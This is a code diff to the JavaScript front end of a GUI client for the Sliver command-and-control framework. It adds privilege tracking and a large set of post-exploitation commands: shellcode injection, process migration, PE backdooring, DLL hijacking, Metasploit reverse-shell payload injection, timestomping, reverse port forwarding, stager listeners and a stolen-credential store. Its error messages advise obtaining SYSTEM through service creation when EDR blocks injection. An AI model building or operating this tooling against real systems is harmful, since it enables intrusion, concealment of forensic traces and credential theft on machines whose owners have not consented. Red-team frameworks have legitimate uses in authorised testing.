@@ -11,6 +11,7 @@ const openTabs = {};
 const eventLog = [];
 const EVENT_MAX = 500;
 const notesMap = {};          // agent id -> operator notes (in-memory, cleared on disconnect)
+const integrityMap = {};      // agent id -> real integrity level from getprivs (System/High/Medium/Low)
 let activeInteractId = null;  // currently focused agent tab
 
 // ── Utils ──────────────────────────────────────────────────────────────────
@@ -22,11 +23,21 @@ function toast(type, msg, dur=3000) {
 }
 
 function isPrivileged(obj) {
+  // If we've actually queried integrity for this agent, trust that over the guess.
+  const lvl = (integrityMap[obj.id] || '').toLowerCase();
+  if (lvl) return lvl.includes('system') || lvl.includes('high');
   const u = (obj.username || '').trim().toLowerCase();
   if (!u) return false;
-  // Machine account (HOST$) runs as SYSTEM; NT AUTHORITY\* and admin/root are privileged.
+  // Fallback heuristic: machine account (HOST$) = SYSTEM; NT AUTHORITY\*/admin/root.
   if (u.endsWith('$')) return true;
   return ['nt authority', 'system', 'administrator', 'admin', 'root'].some(k => u.includes(k));
+}
+// integrityLabel returns a short label for a node when its integrity is known.
+function integrityLabel(obj) {
+  const lvl = integrityMap[obj.id];
+  if (!lvl) return '';
+  if ((obj.username || '').trim().endsWith('$') || (obj.username || '').toLowerCase().includes('system')) return 'SYSTEM';
+  return lvl.toUpperCase();
 }
 function osLabel(os) {
   const o = (os||'').toLowerCase();
@@ -37,11 +48,10 @@ function osLabel(os) {
 }
 // osIconHref returns the PNG icon path for an OS + privilege level (icons live in
 // frontend/dist/icons). HIGH = privileged, NORMAL = user. Falls back to Windows.
-function osIconHref(os, priv) {
+function osIconHref(os, priv, dead) {
   const o = (os||'').toLowerCase();
-  const lvl = priv ? 'HIGH' : 'NORMAL';
+  const lvl = dead ? 'DEAD' : (priv ? 'HIGH' : 'NORMAL');   // DEAD > HIGH > NORMAL
   if (o.includes('linux')) return `./icons/LINUX-${lvl}.png`;
-  if (o.includes('windows')) return `./icons/WIN-${lvl}.png`;
   // macOS / container / unknown — no dedicated icon; use the Windows art.
   return `./icons/WIN-${lvl}.png`;
 }
@@ -90,6 +100,7 @@ document.getElementById('disconnect-btn').addEventListener('click', async () => 
   document.getElementById('interact-panels').innerHTML = '<div class="empty-interact" id="empty-interact"><p>Double-click an agent to interact.</p></div>';
   for (const k in openTabs) delete openTabs[k];
   for (const k in notesMap) delete notesMap[k];
+  for (const k in integrityMap) delete integrityMap[k];
   activeInteractId = null;
   allSessions = []; allBeacons = [];
   selectedConfigPath = null; cancelReconnect();
@@ -141,23 +152,27 @@ async function refreshAgents() {
 document.getElementById('refresh-all-btn').addEventListener('click', refreshAgents);
 
 // ── Table view ─────────────────────────────────────────────────────────────
+// userCell renders the user column, highlighting privileged (SYSTEM/admin/★) agents.
+function userCell(o) {
+  const il = integrityLabel(o);
+  return isPrivileged(o)
+    ? `<td class="user-priv" title="Privileged (right-click → Check Integrity for the real level)">★ ${esc(o.username)}${il ? ` [${il}]` : ''}</td>`
+    : `<td>${esc(o.username)}${il ? ` <span style="color:var(--muted)">[${il}]</span>` : ''}</td>`;
+}
 function renderTable() {
   const body = document.getElementById('agents-body');
   body.innerHTML = '';
-  allSessions.forEach(s => {
-    const tr = document.createElement('tr'); tr.dataset.id = s.id; tr.dataset.kind = 'session';
-    tr.innerHTML = `<td class="type-session">SESSION</td><td>${esc(s.name||s.id.slice(0,8))}</td><td>${esc(s.hostname)}</td><td>${esc(s.username)}</td><td>${esc(s.os)}/${esc(s.arch)}</td><td>${s.pid}</td><td>${esc(s.transport)}</td><td>${esc(s.remoteAddress)}</td><td>${esc(s.lastCheckin)}</td><td class="${s.isDead?'status-dead':'status-alive'}">${s.isDead?'DEAD':'ALIVE'}</td>`;
-    tr.addEventListener('dblclick', () => openInteract('session', s));
-    tr.addEventListener('contextmenu', e => showCtx(e, 'session', s));
+  const row = (o, kind) => {
+    const tr = document.createElement('tr'); tr.dataset.id = o.id; tr.dataset.kind = kind;
+    if (isPrivileged(o) && !o.isDead) tr.classList.add('row-priv');
+    const typeCls = kind === 'session' ? 'type-session' : 'type-beacon';
+    tr.innerHTML = `<td class="${typeCls}">${kind.toUpperCase()}</td><td>${esc(o.name||o.id.slice(0,8))}</td><td>${esc(o.hostname)}</td>${userCell(o)}<td>${esc(o.os)}/${esc(o.arch)}</td><td>${o.pid}</td><td>${esc(o.transport)}</td><td>${esc(o.remoteAddress)}</td><td>${esc(o.lastCheckin)}</td><td class="${o.isDead?'status-dead':'status-alive'}">${o.isDead?'DEAD':'ALIVE'}</td>`;
+    tr.addEventListener('dblclick', () => openInteract(kind, o));
+    tr.addEventListener('contextmenu', e => showCtx(e, kind, o));
     body.appendChild(tr);
-  });
-  allBeacons.forEach(b => {
-    const tr = document.createElement('tr'); tr.dataset.id = b.id; tr.dataset.kind = 'beacon';
-    tr.innerHTML = `<td class="type-beacon">BEACON</td><td>${esc(b.name||b.id.slice(0,8))}</td><td>${esc(b.hostname)}</td><td>${esc(b.username)}</td><td>${esc(b.os)}/${esc(b.arch)}</td><td>${b.pid}</td><td>${esc(b.transport)}</td><td>${esc(b.remoteAddress)}</td><td>${esc(b.lastCheckin)}</td><td class="${b.isDead?'status-dead':'status-alive'}">${b.isDead?'DEAD':'ALIVE'}</td>`;
-    tr.addEventListener('dblclick', () => openInteract('beacon', b));
-    tr.addEventListener('contextmenu', e => showCtx(e, 'beacon', b));
-    body.appendChild(tr);
-  });
+  };
+  allSessions.forEach(s => row(s, 'session'));
+  allBeacons.forEach(b => row(b, 'beacon'));
 }
 
 // ── View toggle ────────────────────────────────────────────────────────────
@@ -193,10 +208,10 @@ function renderGraph() {
 
   let html = `<g id="g-root" transform="translate(${graphView.tx},${graphView.ty}) scale(${graphView.scale})">`;
 
-  // Edges (straight; dashed for beacons)
+  // Edges (straight; dashed for beacons; red for privileged agents)
   nodes.forEach(nd => {
-    const p = graphPos[nd.obj.id], dead = nd.obj.isDead;
-    const cls = `gedge${nd.kind==='beacon'?' beacon':''}${dead?' dead':''}`;
+    const p = graphPos[nd.obj.id], dead = nd.obj.isDead, priv = isPrivileged(nd.obj);
+    const cls = `gedge${nd.kind==='beacon'?' beacon':''}${priv&&!dead?' priv':''}${dead?' dead':''}`;
     html += `<path id="ge-${nd.obj.id}" d="${edgePath(cx,cy,p.x,p.y)}" class="${cls}" fill="none"/>`;
   });
 
@@ -212,10 +227,10 @@ function renderGraph() {
     html += `<g class="gnode${dead?' dead':''}" data-id="${esc(o.id)}" transform="translate(${p.x},${p.y})" style="cursor:grab">`;
     // Transparent hit area so the group receives drag/dblclick (images below are inert).
     html += `<rect x="-28" y="-32" width="56" height="86" fill="transparent"/>`;
-    html += `<image href="${osIconHref(o.os, priv)}" x="-26" y="-26" width="52" height="52" pointer-events="none"/>`;
+    html += `<image href="${osIconHref(o.os, priv, dead)}" x="-26" y="-26" width="52" height="52" pointer-events="none"/>`;
     html += `<text y="38" text-anchor="middle" fill="${labelColor}" font-size="10" font-weight="bold" font-family="var(--font)" pointer-events="none">${esc(o.hostname||o.id.slice(0,6))}</text>`;
     html += `<text y="50" text-anchor="middle" fill="var(--muted)" font-size="8.5" font-family="var(--mono)" pointer-events="none">${esc(shortUser(o.username))} · ${nd.kind}</text>`;
-    if (priv && !dead) html += `<text y="-30" text-anchor="middle" fill="var(--accent)" font-size="8" font-weight="bold" font-family="var(--mono)" pointer-events="none">★ PRIV</text>`;
+    if (priv && !dead) html += `<text y="-30" text-anchor="middle" fill="var(--accent)" font-size="8" font-weight="bold" font-family="var(--mono)" pointer-events="none">★ ${integrityLabel(o) || 'PRIV'}</text>`;
     if (dead) html += `<text y="-30" text-anchor="middle" fill="var(--muted)" font-size="8" font-weight="bold" font-family="var(--mono)" pointer-events="none">DEAD</text>`;
     html += `</g>`;
   });
@@ -314,6 +329,20 @@ function showCtx(e, kind, obj) {
 }
 document.addEventListener('click', () => ctxMenu.classList.add('hidden'));
 document.getElementById('ctx-interact').addEventListener('click', () => { if (activeCtxAgent) openInteract(activeCtxAgent.kind, activeCtxAgent.obj); });
+document.getElementById('ctx-integrity').addEventListener('click', async () => {
+  if (!activeCtxAgent) return;
+  const { kind, obj } = activeCtxAgent;
+  if (kind !== 'session') return toast('info', 'Integrity check needs an interactive session (for a beacon, run getprivs in its console)');
+  if (!(obj.os || '').toLowerCase().includes('windows')) return toast('info', 'Integrity levels are a Windows concept');
+  toast('info', `Checking integrity of ${obj.hostname}...`);
+  const r = await App().GetPrivs(obj.id).catch(() => null);
+  if (!r || !r.integrity) return toast('err', 'getprivs failed (needs a live Windows session)');
+  integrityMap[obj.id] = r.integrity;
+  const label = integrityLabel(obj) || r.integrity;
+  toast(isPrivileged(obj) ? 'ok' : 'info', `${obj.hostname}: ${label} integrity`);
+  renderTable();
+  if (!document.getElementById('graph-view').classList.contains('hidden')) renderGraph();
+});
 document.getElementById('ctx-rename').addEventListener('click', async () => {
   if (!activeCtxAgent || activeCtxAgent.kind !== 'session') return;
   const n = prompt('New name:'); if (!n) return;
@@ -413,22 +442,40 @@ Core commands (session & beacon):
   kill <pid>                 Terminate a remote process
   loot [add <file>|rm <id>]  Save a target file to the shared loot store / list
 
+  chmod <path> <mode>        Change file mode (e.g. 0755)
+  chown <path> <uid> <gid>   Change file owner
+
 Privilege / execution (session only):
   getsystem <profile> [proc] Escalate to SYSTEM via an implant profile
   make-token <dom> <u> <p>   Create a token from credentials
   impersonate <user>         Impersonate a logged-on user
   rev2self                   Drop an impersonated token
-  execute-assembly <args>    Run a .NET assembly (native open dialog)
-  sideload <args>            Sideload a DLL/.so (native open dialog)
+  runas -u <u> [-p <p>] <prog> [args]   Run a program as another user
+  migrate <pid> <profile>    Migrate the implant into another process
+  execute-assembly <local.exe> [args]   Run a .NET assembly (path or dialog)
+  execute-shellcode <local.bin> [pid]   Inject shellcode (path or dialog)
+  sideload <local.dll> [args]           Sideload a DLL/.so (path or dialog)
+  spawndll <local.dll> [args]           Reflectively load a DLL (path or dialog)
+  extensions                            List installed + loaded extensions/BOFs
+  ext <command> [args...]               Run an extension/BOF (e.g. ext sa-whoami)
+  backdoor <remote_pe> <profile>        Backdoor an on-disk PE with an implant
+  dllhijack <ref_dll> <target> <profile>  Plant a hijacking DLL
+  msf <payload> <lhost> <lport>         Run a Metasploit payload in-process
+  msf-inject <payload> <lhost> <lport> <pid>  Inject an msf payload into a PID
 
 Pivoting / tunneling (session only):
   socks start <port>|stop|status
   portfwd add <lport> <rhost> <rport> | rm <lport> | list
+  rportfwd add <bindport> <fwdhost> <fwdport> | rm <id> | list
+  wg-portfwd add <lport> <rhost:port> | rm <id>   (WireGuard implants)
+  wg-socks <port> | stop <id>                      (WireGuard implants)
   pivot  start tcp|pipe <bind> | stop <id> | list
   services                   List Windows services
 
 Beacon only:
   tasks                      Show the beacon task queue
+  reconfig <interval> <jitter>   Change the beacon check-in interval (seconds)
+  interactive                Open an interactive session from this beacon
   (all commands are queued and run on next check-in)
 `.trim();
 
@@ -469,6 +516,15 @@ async function dispatchCmd(kind, id, raw) {
 
   // ── beacons: queue command, then poll for the result (non-blocking) ──
   if (kind === 'beacon') {
+    if (cmd === 'reconfig') {
+      if (args.length < 2) return appendOut(id, 'usage: reconfig <interval_sec> <jitter_sec>', 'err');
+      await App().ReconfigureBeacon(id, parseInt(args[0]), parseInt(args[1]));
+      return appendOut(id, `[+] reconfigure queued — interval ${args[0]}s / jitter ${args[1]}s (applies on next check-in)`, 'ok');
+    }
+    if (cmd === 'interactive') {
+      await App().InteractiveBeacon(id);
+      return appendOut(id, '[+] interactive session requested — it will appear as a session on next check-in', 'ok');
+    }
     const shellCmd = cmd === 'shell' ? args.join(' ') : raw;
     const r = await App().ExecuteBeaconCommandAsync(id, shellCmd).catch(e => ({ error: String(e) }));
     if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
@@ -556,11 +612,11 @@ async function dispatchCmd(kind, id, raw) {
       const err = await App().GetSystem(id, args[1] || '', args[0]).then(() => null).catch(e => String(e));
       if (err) {
         if (err.includes('main.go') || err.includes('parse') || err.includes('IDENT')) {
-          return appendOut(id, `[error] profile "${args[0]}" has an old/incomplete config that won't build. Open the Profiles panel, DELETE it, and CREATE it again (the new save writes a complete config), then retry getsystem.`, 'err');
+          return appendOut(id, `[error] the teamserver failed to generate the shellcode implant for getsystem (server-side codegen error, not the GUI). This is a known Sliver server issue with shellcode/inject generation. Workaround: use the service-persistence method (sc create + a generated exe) to get SYSTEM, which you've already done successfully.`, 'err');
         }
         return appendOut(id, `[error] ${err}`, 'err');
       }
-      return appendOut(id, '[+] getsystem requested (a new SYSTEM implant is being built + injected)', 'out');
+      return appendOut(id, '[*] getsystem accepted by the teamserver. It builds a NEW shellcode implant and injects it — watch the sessions list for a SYSTEM node in ~1-2 min.\n    If nothing appears, the server-side shellcode build or the injection was blocked (Defender/EDR). Reliable alternative: create a service that runs a generated implant (sc create ... + start) — that returns a SYSTEM session directly.', 'info');
     }
     case 'make-token': {
       if (args.length < 3) return appendOut(id, 'usage: make-token <domain> <username> <password>', 'err');
@@ -574,13 +630,17 @@ async function dispatchCmd(kind, id, raw) {
     }
     case 'rev2self': { await App().RevToSelf(id); return appendOut(id, '[+] reverted to self', 'out'); }
     case 'execute-assembly': {
-      appendOut(id, '[*] select assembly...', 'pending');
-      const r = await App().ExecuteAssembly(id, args.join(' '));
-      return appendOut(id, r.error ? `[error] ${r.error}` : (r.output || '[+] done'), r.error?'err':'out');
+      // execute-assembly <local-path> [assembly args]   (no path = file dialog)
+      appendOut(id, args.length ? `[*] running ${args[0]}...` : '[*] no path given — opening file dialog...', 'pending');
+      const r = await App().ExecuteAssembly(id, args[0] || '', args.slice(1).join(' '));
+      if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
+      if (r.output && r.output.trim()) return appendOut(id, r.output.trimEnd(), 'out');
+      return appendOut(id, '[+] executed, but NO output was captured.\n    execute-assembly runs .NET/CLR assemblies ONLY. If this is a native binary\n    (e.g. mimikatz.exe), use: upload it then `execute`, or `sideload` the mimikatz DLL.', 'info');
     }
     case 'sideload': {
-      appendOut(id, '[*] select DLL/.so...', 'pending');
-      const r = await App().Sideload(id, args.join(' '), '');
+      // sideload <local-path> [args]   (no path = file dialog)
+      appendOut(id, args.length ? `[*] sideloading ${args[0]}...` : '[*] no path given — opening file dialog...', 'pending');
+      const r = await App().Sideload(id, args[0] || '', args.slice(1).join(' '), '');
       return appendOut(id, r.error ? `[error] ${r.error}` : (r.output || '[+] done'), r.error?'err':'out');
     }
     case 'socks': {
@@ -692,6 +752,54 @@ async function dispatchCmd(kind, id, raw) {
       const r = await App().ProcessDump(id, parseInt(args[0]));
       return appendOut(id, r.error ? `[error] ${r.error}` : `[+] dumped ${fmtSize(r.bytes)} -> ${r.path}`, r.error?'err':'out');
     }
+    case 'extensions': case 'ext-list': {
+      const installed = await App().ListInstalledExtensions().catch(() => []);
+      const loaded = await App().ListImplantExtensions(id).catch(() => []);
+      let out = 'INSTALLED COMMANDS  (run with:  ext <command> [args...])\n';
+      if (!installed.length) out += '  (none installed — use the Sliver CLI: armory install <name>)\n';
+      installed.forEach(e => out += `  ${(e.command||'').padEnd(20)}${e.isBof?'[BOF] ':'      '}${e.args||''}${e.help?('  — '+e.help):''}\n`);
+      out += `\nLOADED IN THIS IMPLANT:  ${loaded && loaded.length ? loaded.join(', ') : '(none yet)'}`;
+      return appendOut(id, out, 'out');
+    }
+    case 'ext': {
+      if (!args[0]) return appendOut(id, 'usage: ext <command> [args...]   (list them with: extensions)', 'err');
+      appendOut(id, `[*] running extension '${args[0]}'...`, 'pending');
+      const r = await App().RunExtension(id, args[0], args.slice(1)).then(o => ({ o })).catch(e => ({ err: String(e) }));
+      if (r.err) return appendOut(id, `[error] ${r.err}`, 'err');
+      return appendOut(id, (r.o && r.o.trim()) ? r.o.trimEnd() : '[+] executed (no output)', 'out');
+    }
+    case 'backdoor': {
+      if (args.length < 2) return appendOut(id, 'usage: backdoor <remote_pe_path> <profile>', 'err');
+      const err = await App().Backdoor(id, args[0], args[1]).then(()=>null).catch(e=>String(e));
+      return appendOut(id, err ? `[error] ${err}` : `[+] backdoored ${args[0]} with profile ${args[1]}`, err?'err':'out');
+    }
+    case 'dllhijack': {
+      if (args.length < 3) return appendOut(id, 'usage: dllhijack <reference_dll> <target_location> <profile>', 'err');
+      const err = await App().DllHijack(id, args[0], args[1], args[2]).then(()=>null).catch(e=>String(e));
+      return appendOut(id, err ? `[error] ${err}` : `[+] DLL hijack planted at ${args[1]}`, err?'err':'out');
+    }
+    case 'msf': {
+      if (args.length < 3) return appendOut(id, 'usage: msf <payload> <lhost> <lport>   (e.g. windows/x64/meterpreter/reverse_tcp)', 'err');
+      const err = await App().MsfInject(id, args[0], args[1], parseInt(args[2])).then(()=>null).catch(e=>String(e));
+      return appendOut(id, err ? `[error] ${err}` : '[+] msf payload staged into the implant process', err?'err':'out');
+    }
+    case 'msf-inject': {
+      if (args.length < 4) return appendOut(id, 'usage: msf-inject <payload> <lhost> <lport> <pid>', 'err');
+      const err = await App().MsfRemoteInject(id, args[0], args[1], parseInt(args[2]), parseInt(args[3])).then(()=>null).catch(e=>String(e));
+      return appendOut(id, err ? `[error] ${err}` : `[+] msf payload injected into PID ${args[3]}`, err?'err':'out');
+    }
+    case 'wg-portfwd': {
+      const sub = (args[0]||'').toLowerCase();
+      if (sub === 'add') { await App().WGStartPortForward(id, parseInt(args[1]), args[2]); return appendOut(id, `[+] WG forward 127.0.0.1:${args[1]} -> ${args[2]}`, 'out'); }
+      if (sub === 'rm')  { await App().WGStopPortForward(id, parseInt(args[1])); return appendOut(id, `[+] WG forward ${args[1]} stopped`, 'out'); }
+      return appendOut(id, 'usage: wg-portfwd add <lport> <remoteHost:port> | rm <id>', 'err');
+    }
+    case 'wg-socks': {
+      const sub = (args[0]||'').toLowerCase();
+      if (sub === 'stop') { await App().WGStopSocks(id, parseInt(args[1])); return appendOut(id, `[+] WG socks ${args[1]} stopped`, 'out'); }
+      await App().WGStartSocks(id, parseInt(args[0])||1081);
+      return appendOut(id, `[+] WG SOCKS proxy on 127.0.0.1:${parseInt(args[0])||1081}`, 'out');
+    }
     case 'loot': {
       const sub = (args[0]||'').toLowerCase();
       if (sub === 'add') {
@@ -707,6 +815,52 @@ async function dispatchCmd(kind, id, raw) {
       loot.forEach(l => { out += `${(l.id||'').slice(0,12).padEnd(14)}${(l.type||'').padEnd(12)}${l.name||''}\n`; });
       return appendOut(id, out.trimEnd(), 'out');
     }
+    case 'runas': {
+      let user='', pass='', dom='', rest=[];
+      for (let i=0;i<args.length;i++){ if(args[i]==='-u')user=args[++i]||''; else if(args[i]==='-p')pass=args[++i]||''; else if(args[i]==='-d')dom=args[++i]||''; else rest.push(args[i]); }
+      if(!user || !rest.length) return appendOut(id, 'usage: runas -u [DOMAIN\\]<user> [-p <pass>] <program> [args]', 'err');
+      // Split DOMAIN\user (or user@domain) into separate domain + username.
+      if (user.includes('\\')) { const p = user.split('\\'); dom = dom || p[0]; user = p[1]; }
+      else if (user.includes('@')) { const p = user.split('@'); user = p[0]; dom = dom || p[1]; }
+      if (!dom) dom = '.';   // local account
+      const outp = await App().RunAs(id, user, dom, pass, rest[0], rest.slice(1).join(' '));
+      return appendOut(id, outp || '[+] done', 'out');
+    }
+    case 'migrate': {
+      if (args.length < 2) return appendOut(id, 'usage: migrate <pid> <profile>  (profile = a saved implant profile)', 'err');
+      const err = await App().Migrate(id, parseInt(args[0]), args[1]).then(()=>null).catch(e=>String(e));
+      return appendOut(id, err ? `[error] ${err}` : `[+] migration into PID ${args[0]} requested`, err?'err':'out');
+    }
+    case 'execute-shellcode': {
+      // execute-shellcode <local-path> [pid]   (no path = file dialog)
+      appendOut(id, args.length ? `[*] injecting ${args[0]}...` : '[*] no path given — opening file dialog...', 'pending');
+      const r = await App().ExecuteShellcode(id, args[0] || '', parseInt(args[1])||0);
+      return appendOut(id, r.error ? `[error] ${r.error}` : (r.output||'[+] done'), r.error?'err':'out');
+    }
+    case 'spawndll': {
+      // spawndll <local-path> [args]   (no path = file dialog)
+      appendOut(id, args.length ? `[*] spawning ${args[0]}...` : '[*] no path given — opening file dialog...', 'pending');
+      const r = await App().SpawnDll(id, args[0] || '', args.slice(1).join(' '), '');
+      return appendOut(id, r.error ? `[error] ${r.error}` : (r.output||'[+] done'), r.error?'err':'out');
+    }
+    case 'chmod': { if (args.length < 2) return appendOut(id, 'usage: chmod <path> <mode>  (e.g. 0755)', 'err'); await App().Chmod(id, args[0], args[1]); return appendOut(id, `[+] chmod ${args[1]} ${args[0]}`, 'out'); }
+    case 'chown': { if (args.length < 3) return appendOut(id, 'usage: chown <path> <uid> <gid>', 'err'); await App().Chown(id, args[0], args[1], args[2]); return appendOut(id, `[+] chown ${args[1]}:${args[2]} ${args[0]}`, 'out'); }
+    case 'chtimes': case 'timestomp': {
+      if (args.length < 2) return appendOut(id, 'usage: chtimes <path> <YYYY-MM-DD HH:MM:SS>', 'err');
+      const ts = Math.floor(new Date(args.slice(1).join(' ')).getTime()/1000);
+      if (isNaN(ts)) return appendOut(id, 'invalid date — use e.g. 2021-01-01 09:00:00', 'err');
+      await App().Chtimes(id, args[0], ts, ts);
+      return appendOut(id, `[+] timestomped ${args[0]} -> ${args.slice(1).join(' ')}`, 'out');
+    }
+    case 'rportfwd': {
+      const sub = (args[0]||'').toLowerCase();
+      if (sub === 'add') { await App().StartRportFwd(id, '0.0.0.0', parseInt(args[1]), args[2], parseInt(args[3])); return appendOut(id, `[+] reverse forward: target :${args[1]} -> ${args[2]}:${args[3]}`, 'out'); }
+      if (sub === 'rm') { await App().StopRportFwd(id, parseInt(args[1])); return appendOut(id, `[+] removed reverse forward ${args[1]}`, 'out'); }
+      const fwds = await App().ListRportFwds(id);
+      return appendOut(id, fwds.length ? fwds.map(f => `#${f.id} ${f.bind} -> ${f.forward}`).join('\n') : '[*] no reverse port forwards', 'info');
+    }
+    case 'getpid': return appendOut(id, String(tab.obj.pid), 'out');
+    case 'getuid': case 'getgid': return dispatchCmd(kind, id, 'whoami');
     default: {
       // Server/panel commands are not session commands — guide instead of
       // silently running them in cmd.exe.
@@ -790,6 +944,8 @@ document.querySelectorAll('.tb-btn').forEach(btn => {
     if (view === 'profiles') openProfilesPanel();
     if (view === 'events') openEventsPanel();
     if (view === 'loot') openLootPanel();
+    if (view === 'creds') openCredsPanel();
+    if (view === 'hosts') openHostsPanel();
     if (view === 'operators') openOperatorsPanel();
   });
 });
@@ -836,13 +992,24 @@ const SERVER_HELP = `Server console — runs teamserver commands (NOT on a targe
   jobs kill <id>           kill a listener/job
   operators | players      list operators
   loot [rm <id>]           list / remove loot
+  hosts [rm <id>]          list / remove hosts DB entries
+  creds [add <u> <p> | rm <id>]   list / add / remove credentials
   builds                   list implant builds
+  regenerate <name>        re-download a previous build
   profiles                 list implant profiles
+  websites [rm <name>]     list / remove hosted websites
+  canaries                 list DNS canaries (tripwires)
+  stager <host> <port> <profile>   start a TCP stager listener
   use <id-prefix>          interact with a session/beacon
+  c2profiles               list HTTP C2 profiles
+  rename <id> <name>       rename a session
+  kill-session <id>        kill a session
+  kill-beacon <id>         remove a beacon
   mtls [port]              start an mTLS listener (default 8443)
   http [port]              start an HTTP listener (default 80)
   https [port]             start an HTTPS listener (default 443)
   dns <domain...>          start a DNS listener
+  wg [port] [nport] [key]  start a WireGuard listener
   clear                    clear this console`;
 
 function pinServerConsole() {
@@ -921,6 +1088,44 @@ async function runServerCmd(raw) {
       case 'http': { await App().StartHTTPListener({host:'0.0.0.0',port:parseInt(args[0])||80,secure:false}); return appendServer(`[+] HTTP listener started on :${parseInt(args[0])||80}`, 'out'); }
       case 'https': { await App().StartHTTPListener({host:'0.0.0.0',port:parseInt(args[0])||443,secure:true}); return appendServer(`[+] HTTPS listener started on :${parseInt(args[0])||443}`, 'out'); }
       case 'dns': { if (!args.length) return appendServer('usage: dns <domain...>', 'err'); await App().StartDNSListener({domains:args}); return appendServer(`[+] DNS listener for ${args.join(', ')}`, 'out'); }
+      case 'wg': case 'wireguard': { await App().StartWGListener({port:parseInt(args[0])||53,nPort:parseInt(args[1])||8888,keyPort:parseInt(args[2])||1337}); return appendServer(`[+] WireGuard listener started`, 'out'); }
+      case 'kill-session': case 'rm-session': { if (!args[0]) return appendServer('usage: kill-session <id-prefix>', 'err'); const s = allSessions.find(x => x.id.startsWith(args[0])); if (!s) return appendServer('no matching session', 'err'); await App().KillSession(s.id); return appendServer(`[+] killed session ${s.hostname}`, 'out'); }
+      case 'kill-beacon': case 'rm-beacon': { if (!args[0]) return appendServer('usage: kill-beacon <id-prefix>', 'err'); const b = allBeacons.find(x => x.id.startsWith(args[0])); if (!b) return appendServer('no matching beacon', 'err'); await App().KillBeacon(b.id); return appendServer(`[+] removed beacon ${b.hostname}`, 'out'); }
+      case 'rename': { if (args.length < 2) return appendServer('usage: rename <session-id-prefix> <new-name>', 'err'); const s = allSessions.find(x => x.id.startsWith(args[0])); if (!s) return appendServer('no matching session', 'err'); await App().RenameSession(s.id, args.slice(1).join(' ')); refreshAgents(); return appendServer('[+] renamed', 'out'); }
+      case 'c2profiles': { const p = await App().ListC2Profiles(); if (!p.length) return appendServer('no HTTP C2 profiles', 'info'); return appendServer(p.map(x => x.name).join('\n'), 'out'); }
+      case 'hosts': {
+        if (args[0] === 'rm') { await App().DeleteHost(args[1]); return appendServer(`[+] host ${args[1]} removed`, 'out'); }
+        const h = await App().ListHosts(); if (!h.length) return appendServer('no hosts in the database', 'info');
+        let o = 'HOSTNAME             OS                             UUID\n';
+        h.forEach(x => o += `${(x.hostname||'').slice(0,20).padEnd(21)}${(x.os||'').slice(0,30).padEnd(31)}${(x.uuid||'').slice(0,12)}\n`);
+        return appendServer(o.trimEnd(), 'out');
+      }
+      case 'creds': {
+        if (args[0] === 'add') { if (args.length < 3) return appendServer('usage: creds add <username> <password>', 'err'); await App().AddCred(args[1], args[2], ''); return appendServer('[+] credential added', 'out'); }
+        if (args[0] === 'rm') { await App().DeleteCred(args[1]); return appendServer(`[+] credential ${args[1]} removed`, 'out'); }
+        const c = await App().ListCreds(); if (!c.length) return appendServer('no credentials stored', 'info');
+        let o = 'USERNAME             PLAINTEXT / HASH\n';
+        c.forEach(x => o += `${(x.username||'').slice(0,20).padEnd(21)}${x.plaintext || x.hash || ''}\n`);
+        return appendServer(o.trimEnd(), 'out');
+      }
+      case 'regenerate': { if (!args[0]) return appendServer('usage: regenerate <build-name>', 'err'); const r = await App().RegenerateBuild(args[0]); return appendServer(r.error ? `[error] ${r.error}` : `[+] saved ${r.path} (${fmtSize(r.bytes)})`, r.error?'err':'out'); }
+      case 'websites': {
+        if (args[0] === 'rm') { await App().RemoveWebsite(args[1]); return appendServer(`[+] website ${args[1]} removed`, 'out'); }
+        const w = await App().ListWebsites(); if (!w.length) return appendServer('no websites', 'info');
+        return appendServer(w.map(x => `${(x.name||'').padEnd(20)} ${x.paths} path(s)`).join('\n'), 'out');
+      }
+      case 'canaries': {
+        const c = await App().ListCanaries(); if (!c.length) return appendServer('no canaries', 'info');
+        let o = 'DOMAIN                         IMPLANT              TRIGGERED  COUNT\n';
+        c.forEach(x => o += `${(x.domain||'').slice(0,30).padEnd(31)}${(x.implantName||'').slice(0,20).padEnd(21)}${(x.triggered?'YES':'no').padEnd(11)}${x.count}\n`);
+        return appendServer(o.trimEnd(), 'out');
+      }
+      case 'stager': {
+        if (args.length < 3) return appendServer('usage: stager <host> <port> <profile>', 'err');
+        const jid = await App().StartStagerListener(args[0], parseInt(args[1]), args[2]).catch(e => { appendServer(`[error] ${e}`, 'err'); return null; });
+        if (jid !== null) return appendServer(`[+] TCP stager listener started on ${args[0]}:${args[1]} (job ${jid})`, 'out');
+        return;
+      }
       default: appendServer(`unknown server command: ${cmd}  (type 'help')`, 'err');
     }
   } catch (e) { appendServer('[error] ' + e, 'err'); }
@@ -971,6 +1176,49 @@ async function lootDownload(lootID) {
   toast(r.error ? 'err' : 'ok', r.error ? `Loot download failed: ${r.error}` : `Saved to ${r.path}`);
 }
 
+// ── Creds panel ─────────────────────────────────────────────────────────────
+function openCredsPanel() {
+  const content = `<div class="panel" style="margin-bottom:12px"><h3>Add Credential</h3>
+    <form id="cred-form">
+      <div class="gen-row">
+        <div class="gen-field"><label>Username</label><input name="username" placeholder="user"/></div>
+        <div class="gen-field"><label>Password / Plaintext</label><input name="plaintext" placeholder="P@ss"/></div>
+        <div class="gen-field"><label>Hash (optional)</label><input name="hash" placeholder="NTLM/hash"/></div>
+      </div>
+      <div class="gen-row"><button type="submit" class="btn accent" style="margin-left:auto">Add</button></div>
+      <div id="cred-msg" class="status-msg"></div>
+    </form></div>
+    <div style="overflow:auto;flex:1" id="creds-list"><div style="padding:10px;color:var(--muted)">Loading...</div></div>`;
+  openViewPanel('_creds', 'Credentials', content);
+  const f = document.getElementById('cred-form');
+  f.addEventListener('submit', async e => {
+    e.preventDefault();
+    const msg = document.getElementById('cred-msg'); msg.textContent = 'Saving...'; msg.className = 'status-msg';
+    const err = await App().AddCred(f.username.value, f.plaintext.value, f.hash.value).then(()=>null).catch(e=>String(e));
+    if (err) { msg.textContent = err; msg.className = 'status-msg err'; }
+    else { msg.textContent = 'Added'; msg.className = 'status-msg ok'; f.reset(); refreshCredsList(); }
+  });
+  refreshCredsList();
+}
+async function refreshCredsList() {
+  const el = document.getElementById('creds-list'); if (!el) return;
+  const creds = await App().ListCreds().catch(() => []);
+  if (!creds.length) { el.innerHTML = '<div style="padding:10px;color:var(--muted)">No credentials stored.</div>'; return; }
